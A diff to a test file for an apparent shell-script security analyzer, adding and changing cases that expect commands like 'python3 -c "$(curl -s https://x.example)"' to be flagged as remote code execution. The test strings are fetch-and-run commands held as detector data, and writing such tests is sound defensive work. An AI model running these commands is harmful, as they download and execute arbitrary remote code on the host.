@@ -126,7 +126,8 @@ def test_downloaded_code_passed_to_other_interpreters_is_high() -> None:
 def test_downloaded_code_after_combined_interpreter_flags_is_high() -> None:
     for script in (
         'python3 -Bc "$(curl -s https://x.example)"\n',
+        'python3 -Wonce -c "$(curl -s https://x.example)"\n',
         'perl -le "$(curl -s https://x.example)"\n',
-        'node -e"$(curl -s https://x.example)"\n',
+        'node -pe "$(curl -s https://x.example)"\n',
     ):
         assert "remote_code_execution" in analyze(script, "/ws").rules, script
